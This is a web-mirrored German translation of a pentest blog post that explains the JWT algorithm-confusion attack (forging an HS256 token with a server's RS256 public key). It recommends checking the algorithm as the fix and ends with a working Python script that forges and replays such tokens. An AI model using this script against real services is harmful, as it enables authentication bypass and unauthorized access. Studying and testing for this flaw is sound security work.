<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏽‍🏫 🏂 👩🏿‍🤝‍👨🏻 JWT: Digital Signature Attack VS MAC Attack 🔯 👩🏼‍🏫 👨🏽‍🚒</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hallo an alle. Es ist kein Geheimnis, dass OTUS jeden Monat mehrere völlig neue und einzigartige Kurse startet, diesen Monat den Pentest. Penetrations...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>JWT: Digital Signature Attack VS MAC Attack</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/467015/">  Hallo an alle.  Es ist kein Geheimnis, dass OTUS jeden Monat mehrere völlig neue und einzigartige Kurse startet, diesen Monat den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Pentest.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Penetrationstestpraxis</a> . <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">“</a>  Nach einer gut etablierten Tradition teilen wir Ihnen am Vorabend des Kursbeginns die Übersetzung von nützlichem Material in diese Richtung mit. <br><br><img src="https://habrastorage.org/webt/ly/nt/wp/lyntwpndnfiq1nla4t0xgcadari.png"><br><br><hr><br>  Während des letzten Pentests bin ich auf ein Autorisierungsschema gestoßen, das auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">JSON Web Token</a> (oder nur JWT) basiert.  JWT besteht aus drei Teilen: Header, Nutzlast, Verifizierungsinformationen.  Der erste Teil des Headers enthält den Namen des Algorithmus, der später für den Überprüfungsteil des JWT verwendet wird.  Dies ist gefährlich, da ein Angreifer diese Informationen ändern und so (möglicherweise) steuern kann, welches Schema der Server zur Überprüfung verwendet. <a name="habracut"></a><br><br>  Zwei Schaltungen werden üblicherweise verwendet: RS256 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Algorithmus für</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">digitale Signaturen</a> ) und HS256 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">MAC-basierter Algorithmus</a> ).  Eine völlig unsichere Option wäre ein NULL-Schema: Geben Sie überhaupt keine Überprüfungsinformationen an - leider wurde das NULL-Schema vom Zielwebserver nicht akzeptiert. <br><br>  Eine kleine Variation des <code>type confusion</code> vom <code>type confusion</code> JWT, die möglicherweise funktioniert, wenn die Serverimplementierung eine Validierungsbibliothek verwendet, die einfach Code wie verify (Token, Schlüssel) aufruft und davon ausgeht, dass nur digital signierte Token verwendet werden.  In diesem Fall ist der zweite Parameter „Schlüssel“ immer öffentlich und wird zur Überprüfung angezeigt (digitale Signaturen verwenden den privaten Schlüssel zum Erstellen einer Signatur und den entsprechenden öffentlichen Schlüssel zum Überprüfen der erstellten Signatur). <br><br>  Jetzt kann der Angreifer den öffentlichen Schlüssel erhalten, ein neues MAC-basiertes Token erstellen und damit einen Teil der Überprüfung dieses Tokens erstellen.  In einem MAC-basierten Schema wird nur ein geheimer Schlüssel benötigt, um Verifizierungsinformationen zu erstellen. Daher verwendet der Angreifer einen öffentlichen Schlüssel (digitale Signatur) als geheimen Schlüssel für den MAC.  Wenn dieses Token jetzt zur Überprüfung an den Server übergeben wird, identifiziert die Bibliothek das Schema, das für das Token verwendet wird (das vom Angreifer als HS256 festgelegt wurde und auf das MAC-Schema verweist).  Die Bibliothek verwendet den zweiten Parameter als Eingabe, um den MAC zu erstellen.  Da dies ein öffentlicher Schlüssel ist, stimmt der neue MAC mit dem MAC überein, der an die Angreifer übertragen wurde, und da diese übereinstimmen, akzeptiert der Server ein gefälschtes Token.  Was sollte der Anwendungsentwickler dann tun?  Wenn das Token vom Server akzeptiert wird, sollte der Server immer prüfen, ob der verwendete Algorithmus mit dem ursprünglich vom Entwickler geplanten übereinstimmt. <br><br>  Theoretisch sollte dies leicht zu überprüfen sein, aber ich habe kein funktionierendes Werkzeug gefunden.  Deshalb habe ich selbst ein Python-Skript geschrieben.  Um es zu verwenden, müssen Sie im Quellcode die folgenden Konfigurationen verwenden: <br><br><ul><li>  <code>jwks_url</code> : Wo kann ich Informationen über den öffentlichen Schlüssel erhalten <code>jwks_url</code>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">JWKS wird</a> von vielen Diensten verwendet, um wichtige Informationen offen zu verbreiten. </li><li>  <code>operation_url</code> : Eine HTTP-GET-Anforderung, die ein JWT-Token zur Autorisierung verwendet. </li><li>  <code>token</code> : Eine gültige JWT für eine konfigurierte Operation. </li><li>  <code>audience</code> : Die Zielgruppe, für die das Token konfiguriert wurde. </li></ul><br>  Das Skript führt Folgendes aus: <br><br><ul><li>  Laden Sie die JWKS-Konfigurationsdatei herunter und rufen Sie die Einstellungen für den öffentlichen Schlüssel ab.  Daraus wird eine PEM-Darstellung erstellt. </li><li>  Stellt sicher, dass das konfigurierte Token mithilfe des extrahierten öffentlichen Schlüssels überprüft werden kann. </li><li>  Führt eine konfigurierte Operation mit einem gültigen Token aus und zeigt den empfangenen HTTP-Statuscode und das resultierende Dokument an (es wird angenommen, dass dies JSON ist). </li><li>  Erstellt ein neues Token basierend auf dem konfigurierten.  Im neuen Token wird der Typ in HS256 geändert.  Ein MAC (basierend auf einem offenen Schlüssel) wird berechnet und als Überprüfungsinformation für das Token verwendet. </li><li>  Führen Sie den konfigurierten Vorgang erneut mit dem geänderten Token aus und zeigen Sie den HTTP-Statuscode sowie das zurückgegebene Dokument an. </li></ul><br>  Da der Rückgabestatuscode (mit einem geänderten Token) 401 war (Autorisierung ist verboten), funktionierten Autorisierungsprüfungen auf der Seite des Zielservers und wurden daher durch den Signatur-gegen-Mac-Angriff nicht gefährdet.  Wenn dies funktionieren würde, würden identische Statuscodes und ähnliche resultierende Dokumente mit beiden HTTP-Aufrufen (sowohl mit dem Original als auch mit dem geänderten Token) erstellt. <br><br>  Ich hoffe, dieser Artikel hilft Ihnen bei Ihrer Pentest-Übung. Verwenden Sie das Python-Skript gerne: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> jwt <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> jwcrypto <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> jwk <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> cryptography.x509 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_pem_x509_certificate <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> cryptography.hazmat.backends <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> default_backend <span class="hljs-comment"><span class="hljs-comment"># configuration jwks_url = "https://localhost/oauth2/.well-known/jwks.json" operation_url = "https://localhost/web/v1/user/andy" audience = "https://localhost" token = "eyJh..." # retrieves key from jwks def retrieve_jwks(url): r = requests.get(url) if r.status_code == 200: for key in r.json()['keys']: if key['kty'] == "RSA": return jwk.JWK(**key) print("no usable RSA key found") else: print("could not retrieve JWKS: HTTP status code " + str(r.status_code)) def extract_payload(token, public_key, audience): return jwt.decode(token, public_key, audience=audience, algorithms='RS256') def retrieve_url(url, token): header = {'Authorization' : "Bearer " + token} return requests.get(url, headers=header) # call the original operation and output it's results original = retrieve_url(operation_url, token) print("original: status: " + str(original.status_code) + "\nContent: " + str(original.json())) # get key and extract the original payload (verify it during decoding to make # sure that we have the right key, also verify the audience claim) public_key = retrieve_jwks(jwks_url).export_to_pem() payload = extract_payload(token, public_key, audience) print("(verified) payload: " + str(payload)) # create a new token based upon HS256, cause the jwt library checks this # to prevent against confusion attacks.. that we actually try to do (: mac_key = str(public_key).replace("PUBLIC", "PRIVATE") hs256_token = jwt.encode(payload, key=mac_key, algorithm="HS256") # call the operation with the new token modified = retrieve_url(operation_url, str(hs256_token)) print("modified: status: " + str(modified.status_code) + "\nContent: " + str(modified.json()))</span></span></code> </pre> <br>  Das ist alles.  Wir warten auf alle, die bis zum Ende in einem kostenlosen Webinar zum Thema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">"Wie man anfängt, Fehler im Web zu</a> beseitigen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">"</a> gelesen haben. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de467015/">https://habr.com/ru/post/de467015/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de467003/index.html">Schnelles, bequemes und anpassungsfähiges Menü für 1075 Kategorien (36000 Produkte)</a></li>
<li><a href="../de467005/index.html">Wie man Polynome richtig färbt</a></li>
<li><a href="../de467007/index.html">FLProg - Unabhängige Integration in das Programm von benutzerdefinierten Controllern</a></li>
<li><a href="../de467009/index.html">Erstellen einer Heimbibliothek mit Notion und Python</a></li>
<li><a href="../de467011/index.html">Was Sie in Data Science lesen und sehen sollten: Bücher, Wörterbücher und Kurse</a></li>
<li><a href="../de467017/index.html">Was ist HED / MRSD und wofür ist es?</a></li>
<li><a href="../de467019/index.html">Entwerfen von Dashboards für die E-Commerce-Website für Webanalysen. Teil 3: SEO Channel</a></li>
<li><a href="../de467021/index.html">Wie der Gewissensroboter mit Kunden kommuniziert</a></li>
<li><a href="../de467023/index.html">Wir haben in Grafana ein Plugin zur Überwachung von k8s erstellt: bereits im offiziellen Grafana-Store</a></li>
<li><a href="../de467025/index.html">Über das Netzwerkmodell in Spielen für Anfänger</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>